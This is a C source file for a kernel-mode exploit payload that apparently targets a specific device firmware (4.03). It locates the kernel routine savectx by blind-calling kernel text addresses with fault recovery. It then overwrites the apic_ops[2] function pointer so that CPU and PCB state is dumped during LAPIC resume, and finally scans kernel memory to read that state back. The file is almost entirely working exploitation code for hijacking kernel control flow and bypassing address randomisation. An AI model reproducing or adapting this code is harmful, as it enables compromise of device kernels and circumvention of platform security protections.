#include <stdint.h>

/*
 * state_capture v3 — Find savectx via ktext probe + PCB layout discovery
 *
 * v1/v2 failed because:
 * - savectx address isn't stored as a pointer in kdata (only relative calls)
 * - justreturn is NOT a simple ret — it's in the syscall return path
 *   (swapgs/iret), crashes during LAPIC resume
 * - PCB scan found 0 results on fresh boot (no savectx called yet)
 *
 * v3 approach:
 * - Probe ktext addresses near cpu_switch to find savectx
 * - savectx is in cpu_switch.S, after gpr2dr_2_start (+0x3F9)
 * - ENTRY() macro uses .p2align 4, so probe 16-byte aligned addrs
 * - Signature: returns 1 AND writes current CR3 to [RDI+0x68]
 * - Use pcb_onfault for fault recovery during probing
 *
 * Mode (via fw_ver):
 *   0x4:   FIND    — probe ktext to find savectx, map PCB layout
 *   0x2:   ARM     — point apic_ops[2] at savectx
 *   0x3:   READBACK — scan kdata for PCB dump after resume
 *
 * Output layout (uint64_t indices):
 *
 * Mode 0x4 (FIND — 128 slots):
 *   [0]   magic | status
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   cpu_switch address
 *   [4]   savectx address (0 if not found)
 *   [5]   savectx offset from cpu_switch
 *   [6]   probes_tried
 *   [7]   probes_returned (non-fault)
 *   [8]   probes_returned_1 (returned exactly 1)
 *   [9]   pcb_lstar_offset (within PCB struct)
 *   [10]  verified_lstar (from PCB dump)
 *   [11]  verified_cr3 (from PCB dump)
 *   [12]  actual_lstar
 *   [13]  actual_cr3
 *   --- If savectx found: raw PCB dump ---
 *   [20..51] 32 qwords of PCB (0x00-0xFF)
 *   [52..67] 16 qwords of PCB (0x100-0x17F)
 *   --- Probe log (first 8 non-fault returns) ---
 *   [70 + i*3 + 0]  address probed
 *   [70 + i*3 + 1]  return value
 *   [70 + i*3 + 2]  offset from cpu_switch
 *   [127] end marker
 *
 * Mode 0x2 (ARM — 64 slots):
 *   [3]   savectx address
 *   [4]   original apic_ops[2]
 *   [5]   fingerprint_lstar
 *   [6]   fingerprint_cr3
 *   [7]   sentinel address
 *   [8]   sentinel value
 *   [9]   apic_ops[2] readback
 *   [10]  pcb_lstar_offset (saved for Mode 0x3)
 *   [63]  end marker
 *
 * Mode 0x3 (READBACK — 200 slots):
 *   [3]   sentinel readback
 *   [4]   sentinel survived?
 *   [5]   current apic_ops[2]
 *   [6]   fingerprint_lstar
 *   [7]   fingerprint_cr3
 *   [8]   pcb_found count
 *   [9]   best PCB base address
 *   [10]  lstar_offset used
 *   [11]  KASLR changed?
 *   [20..83]  raw PCB (64 qwords)
 *   [90-99]   interpreted fields
 *   [100] restored apic_ops[2]
 *   [199] end marker
 */

#define MAGIC_SCAP       0x53434150
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218

/* FW 4.03 offsets */
#define APIC_OPS_OFF_KTEXT   0x1934AC8
#define CPU_SWITCH_OFF       (-0x9d6f80)

/* kdata regions */
#define SENTINEL_OFF     0x100
#define FINGERPRINT_OFF  0x200
#define PCB_BUF_OFF      0x400

#define SENTINEL_VAL     0x5356435854455354ULL

/* Known PCB field offsets (assembly constants, stable across versions) */
#define PCB_R15          0x00
#define PCB_R14          0x08
#define PCB_R13          0x10
#define PCB_R12          0x18
#define PCB_RBP          0x20
#define PCB_RSP          0x28
#define PCB_RBX          0x30
#define PCB_RIP          0x38
#define PCB_CR0          0x58
#define PCB_CR3          0x68

#define PCB_SCAN_SIZE    0x200
#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read_cr3(void)
{
    uint64_t val;
    __asm__ volatile("movq %%cr3, %0" : "=r"(val));
    return val;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

/*
 * Call a ktext address with RDI = arg, using pcb_onfault for fault recovery.
 * Returns RAX on success, or 0xFAFAFAFAFAFAFAFA on fault.
 *
 * savectx reads (but doesn't clobber in a harmful way) callee-saved regs
 * to store them in the PCB. We push/pop them manually.
 */
static uint64_t safe_call_rdi(uint64_t func_addr, uint64_t rdi_arg, uint64_t onfault_addr)
{
    uint64_t result;
    __asm__ volatile(
        "pushq %%rbx\n\t"
        "pushq %%rbp\n\t"
        "pushq %%r12\n\t"
        "pushq %%r13\n\t"
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"

        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%[onfault])\n\t"

        "movq %[rdi_arg], %%rdi\n\t"
        "callq *%[func]\n\t"

        "movq %%rax, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"

        "2:\n\t"
        "addq $8, %%rsp\n\t"
        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"

        "1:\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "popq %%r13\n\t"
        "popq %%r12\n\t"
        "popq %%rbp\n\t"
        "popq %%rbx\n\t"

        : [result] "=&r"(result)
        : [func] "r"(func_addr), [rdi_arg] "r"(rdi_arg), [onfault] "r"(onfault_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11",
          "memory", "cc"
    );
    return result;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;
    uint64_t cr3 = read_cr3();

    if (mode == 0x4) {
        /* ============================================================
         * MODE 0x4: FIND — Probe ktext near cpu_switch for savectx
         *
         * savectx is in cpu_switch.S, ENTRY-aligned (16 bytes).
         * gpr2dr_2_start = cpu_switch + 0x3F9 = last known landmark.
         * Probe from cpu_switch+0x500 to cpu_switch+0x1500.
         * Signature: returns 1 AND writes CR3 to [RDI+0x68].
         * ============================================================ */
        for (int i = 0; i < 128; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;
        out[12] = lstar;
        out[13] = cr3;

        uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
        out[3] = cpu_switch;

        /* Get onfault address */
        uint64_t curthread;
        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
        uint64_t td_pcb = read8(curthread + TD_PCB);
        if (!td_pcb) {
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FF;
            out[127] = 0xdeadbeefcafe0040ULL;
            return 0;
        }
        uint64_t onfault_addr = td_pcb + PCB_ONFAULT;

        /* PCB buffer in kdata for savectx to write into */
        uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;

        uint64_t savectx_addr = 0;
        uint32_t probes_tried = 0;
        uint32_t probes_returned = 0;
        uint32_t probes_ret1 = 0;
        uint32_t log_idx = 0;

        /* Probe 16-byte aligned ktext addresses after cpu_switch.
         * Range: +0x500 to +0x1500 (covers cpu_throw + savectx + resumectx).
         * This is ~128 probes. */
        uint64_t probe_start = (cpu_switch + 0x500) & ~0xFULL;

        for (uint64_t addr = probe_start;
             addr < cpu_switch + 0x1500 && !savectx_addr;
             addr += 0x10) {
            probes_tried++;

            /* Clear buffer */
            for (int i = 0; i < PCB_SCAN_SIZE / 8; i++)
                write8(pcb_buf + i * 8, 0);

            uint64_t ret = safe_call_rdi(addr, pcb_buf, onfault_addr);

            if (ret == 0xFAFAFAFAFAFAFAFAULL)
                continue;  /* faulted */

            probes_returned++;

            /* Log non-fault returns (first 8) */
            if (log_idx < 8) {
                out[70 + log_idx * 3 + 0] = addr;
                out[70 + log_idx * 3 + 1] = ret;
                out[70 + log_idx * 3 + 2] = addr - cpu_switch;
                log_idx++;
            }

            if (ret == 1) {
                probes_ret1++;

                /* Check CR3 at known offset */
                uint64_t saved_cr3 = read8(pcb_buf + PCB_CR3);
                if (saved_cr3 == cr3) {
                    /* Confirmed savectx! */
                    savectx_addr = addr;
                }
            }
        }

        out[4] = savectx_addr;
        out[5] = savectx_addr ? (savectx_addr - cpu_switch) : 0;
        out[6] = probes_tried;
        out[7] = probes_returned;
        out[8] = probes_ret1;

        if (savectx_addr) {
            /* Re-run with clean buffer to get accurate dump */
            for (int i = 0; i < PCB_SCAN_SIZE / 8; i++)
                write8(pcb_buf + i * 8, 0);
            safe_call_rdi(savectx_addr, pcb_buf, onfault_addr);

            /* Dump raw PCB: 48 qwords (0x180 bytes) */
            for (int i = 0; i < 32; i++)
                out[20 + i] = read8(pcb_buf + i * 8);
            for (int i = 0; i < 16; i++)
                out[52 + i] = read8(pcb_buf + 0x100 + i * 8);

            /* Find LSTAR offset in PCB */
            uint64_t lstar_off = 0;
            for (uint64_t off = 0; off < PCB_SCAN_SIZE; off += 8) {
                if (read8(pcb_buf + off) == lstar) {
                    lstar_off = off;
                    break;
                }
            }

            out[9] = lstar_off;
            out[10] = lstar_off ? read8(pcb_buf + lstar_off) : 0;
            out[11] = read8(pcb_buf + PCB_CR3);

            /* Save savectx addr and lstar_offset to kdata for Mode 0x2/0x3 */
            write8(kdata_base + FINGERPRINT_OFF + 0x18, lstar_off);
            write8(kdata_base + FINGERPRINT_OFF + 0x20, savectx_addr);
        }

        out32[0] = MAGIC_SCAP;
        out32[1] = savectx_addr ? 0x0004 : 0x00FD;
        out[127] = 0xdeadbeefcafe0040ULL;
        return 0;
    }

    if (mode == 0x2) {
        /* ============================================================
         * MODE 0x2: ARM — Point apic_ops[2] at savectx
         *
         * savectx returns 1 (matching xapic_mode's expected return).
         * During LAPIC resume, RDI will contain whatever the caller
         * left there. savectx will write CPU state to [RDI].
         * ============================================================ */
        for (int i = 0; i < 64; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;

        /* Read savectx address saved by Mode 0x4 */
        uint64_t savectx_addr = read8(kdata_base + FINGERPRINT_OFF + 0x20);
        uint64_t lstar_off = read8(kdata_base + FINGERPRINT_OFF + 0x18);

        if (!savectx_addr) {
            /* Try to find it now */
            uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
            uint64_t curthread;
            __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
            uint64_t td_pcb = read8(curthread + TD_PCB);
            uint64_t onfault_addr = td_pcb ? (td_pcb + PCB_ONFAULT) : 0;

            if (onfault_addr) {
                uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;
                uint64_t probe_start = (cpu_switch + 0x500) & ~0xFULL;
                for (uint64_t addr = probe_start;
                     addr < cpu_switch + 0x1500 && !savectx_addr;
                     addr += 0x10) {
                    for (int i = 0; i < PCB_SCAN_SIZE / 8; i++)
                        write8(pcb_buf + i * 8, 0);
                    uint64_t ret = safe_call_rdi(addr, pcb_buf, onfault_addr);
                    if (ret == 1 && read8(pcb_buf + PCB_CR3) == cr3)
                        savectx_addr = addr;
                }
            }
        }

        if (!savectx_addr) {
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FD;
            out[63] = 0xdeadbeefcafe0020ULL;
            return 0;
        }

        out[3] = savectx_addr;

        uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
        volatile uint64_t *apic_table = (volatile uint64_t *)apic_ops_addr;
        uint64_t original_xapic = apic_table[2];
        out[4] = original_xapic;

        /* Save fingerprints */
        uint64_t fp_addr = kdata_base + FINGERPRINT_OFF;
        write8(fp_addr + 0x00, lstar);
        write8(fp_addr + 0x08, cr3);
        write8(fp_addr + 0x10, original_xapic);

        out[5] = lstar;
        out[6] = cr3;
        out[10] = lstar_off;

        /* Write sentinel */
        write8(kdata_base + SENTINEL_OFF, SENTINEL_VAL);
        out[7] = kdata_base + SENTINEL_OFF;
        out[8] = SENTINEL_VAL;

        /* ARM: overwrite apic_ops[2] with savectx */
        apic_table[2] = savectx_addr;
        out[9] = apic_table[2];

        if (apic_table[2] != savectx_addr) {
            apic_table[2] = original_xapic;
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FE;
            out[63] = 0xdeadbeefcafe0020ULL;
            return 0;
        }

        out32[0] = MAGIC_SCAP;
        out32[1] = 0x0002;
        out[63] = 0xdeadbeefcafe0020ULL;
        return 0;
    }

    if (mode == 0x3) {
        /* ============================================================
         * MODE 0x3: READBACK — Find savectx PCB dump after resume
         *
         * During resume, savectx (as apic_ops[2]) was called with
         * whatever RDI the LAPIC code had. It wrote full CPU state
         * to [RDI]. We scan kdata for that PCB using LSTAR+CR3.
         *
         * Also scan for the ACPI suspend PCB (susppcbs[0]).
         * ============================================================ */
        for (int i = 0; i < 200; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;

        /* Check sentinel */
        uint64_t sentinel = read8(kdata_base + SENTINEL_OFF);
        out[3] = sentinel;
        out[4] = (sentinel == SENTINEL_VAL) ? 1 : 0;

        /* Read current apic_ops[2] */
        uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
        volatile uint64_t *apic_table = (volatile uint64_t *)apic_ops_addr;
        out[5] = apic_table[2];

        /* Read fingerprints */
        uint64_t fp_addr = kdata_base + FINGERPRINT_OFF;
        uint64_t fp_lstar = read8(fp_addr + 0x00);
        uint64_t fp_cr3 = read8(fp_addr + 0x08);
        uint64_t fp_orig_xapic = read8(fp_addr + 0x10);
        uint64_t saved_lstar_off = read8(fp_addr + 0x18);

        out[6] = fp_lstar;
        out[7] = fp_cr3;
        out[10] = saved_lstar_off;
        out[11] = (fp_lstar != lstar) ? 1 : 0;

        uint64_t match_lstar = fp_lstar ? fp_lstar : lstar;
        uint64_t match_cr3 = fp_cr3 ? fp_cr3 : cr3;

        /* Also try to discover lstar_offset if we don't have it */
        if (!saved_lstar_off) {
            /* Find savectx and call it locally to discover layout */
            uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
            uint64_t curthread;
            __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
            uint64_t td_pcb = read8(curthread + TD_PCB);
            uint64_t onfault_addr = td_pcb ? (td_pcb + PCB_ONFAULT) : 0;

            if (onfault_addr) {
                uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;
                uint64_t probe_start = (cpu_switch + 0x500) & ~0xFULL;
                for (uint64_t addr = probe_start;
                     addr < cpu_switch + 0x1500;
                     addr += 0x10) {
                    for (int i = 0; i < PCB_SCAN_SIZE / 8; i++)
                        write8(pcb_buf + i * 8, 0);
                    uint64_t ret = safe_call_rdi(addr, pcb_buf, onfault_addr);
                    if (ret == 1 && read8(pcb_buf + PCB_CR3) == cr3) {
                        /* Found savectx, now find LSTAR offset */
                        for (int i = 0; i < PCB_SCAN_SIZE / 8; i++)
                            write8(pcb_buf + i * 8, 0);
                        safe_call_rdi(addr, pcb_buf, onfault_addr);
                        for (uint64_t off = 0xC8; off < PCB_SCAN_SIZE; off += 8) {
                            if (read8(pcb_buf + off) == lstar) {
                                saved_lstar_off = off;
                                out[10] = off;
                                break;
                            }
                        }
                        break;
                    }
                }
            }
        }

        /* Scan for PCBs */
        uint32_t pcb_found = 0;
        uint64_t best_pcb = 0;

        for (uint64_t addr = kdata_base;
             addr < kdata_base + 0x7000000;
             addr += 8) {
            if (read8(addr) != match_cr3)
                continue;

            uint64_t pcb_base = addr - PCB_CR3;
            if (pcb_base < kdata_base)
                continue;

            uint64_t maybe_cr0 = read8(pcb_base + PCB_CR0);
            if ((maybe_cr0 & 0x80000001ULL) != 0x80000001ULL)
                continue;

            if (saved_lstar_off) {
                if (pcb_base + saved_lstar_off >= kdata_base + 0x7000000)
                    continue;
                if (read8(pcb_base + saved_lstar_off) == match_lstar) {
                    pcb_found++;
                    if (!best_pcb)
                        best_pcb = pcb_base;
                }
            } else {
                /* No lstar_offset — accept any PCB with valid CR0+CR3 */
                pcb_found++;
                if (!best_pcb)
                    best_pcb = pcb_base;
            }
        }

        out[8] = pcb_found;
        out[9] = best_pcb;

        if (best_pcb) {
            /* Dump raw PCB: 64 qwords */
            for (int i = 0; i < 64 && (20 + i) < 84; i++)
                out[20 + i] = read8(best_pcb + i * 8);

            out[90] = read8(best_pcb + PCB_RIP);
            out[91] = read8(best_pcb + PCB_RSP);
            out[92] = read8(best_pcb + PCB_RBP);
            out[93] = read8(best_pcb + PCB_CR0);
            out[94] = read8(best_pcb + PCB_CR3);

            if (saved_lstar_off) {
                out[95] = read8(best_pcb + saved_lstar_off);
                if (saved_lstar_off >= 0x10) {
                    out[96] = read8(best_pcb + saved_lstar_off - 0x10);
                    out[97] = read8(best_pcb + saved_lstar_off - 0x08);
                }
                out[98] = read8(best_pcb + saved_lstar_off + 0x08);
                out[99] = read8(best_pcb + saved_lstar_off + 0x10);
            }
        }

        /* Restore apic_ops[2] */
        if (fp_orig_xapic) {
            apic_table[2] = fp_orig_xapic;
            out[100] = apic_table[2];
        }

        out32[0] = MAGIC_SCAP;
        out32[1] = best_pcb ? 0x1003 : 0x0003;
        out[199] = 0xdeadbeefcafe0030ULL;
        return 0;
    }

    /* Unknown mode */
    for (int i = 0; i < 64; i++) out[i] = 0;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out32[0] = MAGIC_SCAP;
    out32[1] = 0x00FF;
    out[63] = 0xdeadbeefcafe00FFULL;
    return 0;
}
